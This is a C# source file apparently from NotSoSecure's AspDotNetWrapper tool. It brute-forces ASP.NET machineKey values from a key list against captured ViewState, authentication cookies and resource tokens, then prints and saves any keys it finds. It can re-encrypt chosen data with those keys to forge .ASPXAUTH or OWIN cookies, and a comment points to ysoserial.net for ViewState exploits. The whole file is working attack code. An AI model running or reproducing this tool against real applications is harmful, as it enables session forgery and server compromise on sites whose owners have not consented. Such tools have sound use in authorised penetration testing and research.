using System;
using System.IO;
using System.Web;
using System.Web.Security.Cryptography;

namespace NotSoSecure.AspDotNetWrapper
{
    class EncryptDecrypt
    {
        public static byte[] DecryptData(byte[] protectedData, string strMachineKeysFilePath, string strTargetPagePath, string strIISAppPath, string strAntiCSRFToken)
        {
            byte[] clearData = null;
            if (File.Exists(strMachineKeysFilePath))
            {
                byte[] byteEncryptionIV = new byte[16];
                Buffer.BlockCopy(protectedData, 0, byteEncryptionIV, 0, byteEncryptionIV.Length);

                Console.Write("\n\nDecryption process start!!\n\n");

                string[] machineKeys = File.ReadAllLines(strMachineKeysFilePath);
                bool bFound = false;
                foreach (string strDecryptionAlgorithm in ContantValue.arrayDecryptionAlgo)
                {
                    foreach(string strValidationAlgorithm in ContantValue.arrayValidationAlgo)
                    {
                        int nIndex = 1;
                        foreach (string strLine in machineKeys)
                        {
                            try
                            {
                                Console.ForegroundColor = ConsoleColor.Blue;
                                Console.Write("\rPocessing machinekeys {0},{1}: {2}/{3}..............", strDecryptionAlgorithm, strValidationAlgorithm, nIndex++, machineKeys.Length);

                                string[] values = strLine.Split(',');
                                string strValidationKey = values[0];
                                string strDecryptionKey = values[1];
                                Purpose objPurpose = null;
                                if (DefinePurpose.enumPurpose == EnumPurpose.VIEWSTATE)
                                    objPurpose = DefinePurpose.GetViewStatePurpose(strTargetPagePath, strIISAppPath, strAntiCSRFToken);
                                else
                                    objPurpose = DefinePurpose.GetPurpose();
                                AspNetCryptoServiceProvider obj = new AspNetCryptoServiceProvider(strValidationKey, strValidationAlgorithm, strDecryptionKey, strDecryptionAlgorithm);
                                ICryptoService cryptoService = obj.GetCryptoService(objPurpose, CryptoServiceOptions.CacheableOutput);

                                clearData = cryptoService.Unprotect(protectedData);
                                if (clearData != null)
                                {
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine("\n\nKeys found!!");
                                    Console.WriteLine("------------");
                                    Console.ForegroundColor = ConsoleColor.Blue;
                                    Console.WriteLine("DecryptionKey:" + strDecryptionKey);
                                    Console.WriteLine("ValidationKey:" + strValidationKey);
                                    DataWriter.WriteKeysToFile(strValidationKey, strDecryptionKey, strValidationAlgorithm, strDecryptionAlgorithm, byteEncryptionIV);
                                    Console.ResetColor();
                                    bFound = true;
                                    break;
                                }
                                else
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("Null data found for following keys!!");
                                    Console.WriteLine("\n\nDecryptionKey:" + strDecryptionKey);
                                    Console.WriteLine("ValidationKey:" + strValidationKey + "\n\n");
                                    Console.ResetColor();
                                }
                            }
                            catch
                            {
                            }
                        }
                        if (bFound)
                            break;
                    }
                    if (bFound)
                        break;
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("\n\nKey path file {0} not found!!\n\n", strMachineKeysFilePath);
                Console.ResetColor();
            }
            return clearData;
        }

        public static bool DecodeViewState(byte[] protectedData, string strMachineKeysFilePath, string modifier, string strPurpose)
        {
            bool bFound = false;
            if (File.Exists(strMachineKeysFilePath))
            {
                Console.Write("\n\nDecode process start!!\n\n");
                string[] machineKeys = File.ReadAllLines(strMachineKeysFilePath);
                foreach (string strDecryptionAlgorithm in ContantValue.arrayDecryptionAlgo)
                {
                    foreach (string strValidationAlgorithm in ContantValue.arrayValidationAlgo)
                    {
                        int nIndex = 1;
                        foreach (string strLine in machineKeys)
                        {
                            try
                            {
                                Console.ForegroundColor = ConsoleColor.Blue;
                                Console.Write("\rPocessing machinekeys {0},{1}: {2}/{3}..............", strDecryptionAlgorithm, strValidationAlgorithm, nIndex++, machineKeys.Length);

                                string[] values = strLine.Split(',');
                                string strValidationKey = values[0];
                                string strDecryptionKey = values[1];

                                string strDecodedData = ViewStateHelper.DecodeData(strValidationKey, strValidationAlgorithm, protectedData, modifier);
                                if (!String.IsNullOrEmpty(strDecodedData))
                                {
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine("\n\nKeys found!!");
                                    Console.WriteLine("------------");
                                    Console.ForegroundColor = ConsoleColor.Blue;
                                    Console.WriteLine("DecryptionKey:" + strDecryptionKey);
                                    Console.WriteLine("ValidationKey:" + strValidationKey);
                                    DataWriter.WriteKeysToFile(strValidationKey, strDecryptionKey, strValidationAlgorithm, strDecryptionAlgorithm, null);
                                    DataWriter.WritePurposeToFile(strPurpose);
                                    Console.WriteLine("\n\nEncodedDataWithoutHash:" + strDecodedData);
                                    Console.ResetColor();
                                    bFound = true;
                                    break;
                                }
                            }
                            catch (Exception e)
                            {   
                                Console.WriteLine("Error Decoding ViewState: " + e);
                            }
                        }
                        if (bFound)
                            break;
                    }
                    if (bFound)
                        break;
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("\n\nKey path file {0} not found!!\n\n", strMachineKeysFilePath);
                Console.ResetColor();
            }
            return bFound;
        }

        public static string EncryptData(string strDecryptDataFilePath)
        {
            ReadObject objData = new ReadObject(strDecryptDataFilePath);
            DefinePurpose.SetPurposeString(objData.Purpose);
            if (DefinePurpose.enumPurpose != EnumPurpose.VIEWSTATE)
            {
                AspNetCryptoServiceProvider obj = new AspNetCryptoServiceProvider(
                    objData.ValidationKey,
                    objData.ValidationAlgo, objData.DecryptionKey, objData.DecryptionAlgo);
                obj.SetEncryptionIV(objData.EncryptionIV);


                Purpose objPurpose = null;
                byte[] byteClearData = null;
                DefinePurpose.GetPurposeAndClearData(objData, out objPurpose, out byteClearData);
                ICryptoService cryptoService = obj.GetCryptoService(objPurpose);

                return PrintData(cryptoService.Protect(byteClearData));
            }
            return "Encryption not supported for this module";
        }

        public static string PrintData(byte[] byteProtectedData)
        {
            string outputString = string.Empty;
            switch (DefinePurpose.enumPurpose)
            {
                case EnumPurpose.OWINCOOKIE:
                    outputString = Convert.ToBase64String(byteProtectedData).Replace('+', '-').Replace('/', '_').Replace("=", "");
                    break;
                case EnumPurpose.ASPXAUTH:
                    outputString = CryptoUtil.BinaryToHex(byteProtectedData);
                    break;
                case EnumPurpose.WEBRESOURCE:
                    outputString = HttpServerUtility.UrlTokenEncode(byteProtectedData);
                    break;
                case EnumPurpose.SCRIPTRESOURCE:
                    outputString = HttpServerUtility.UrlTokenEncode(byteProtectedData);
                    break;
                case EnumPurpose.VIEWSTATE:
                    //Not needs as the exploit generated using ysoseria.net
                    break;
                case EnumPurpose.UNKNOWN:
                    
                    break;
                default:
                    
                    break;
            }
            return outputString;
        }
    }
}
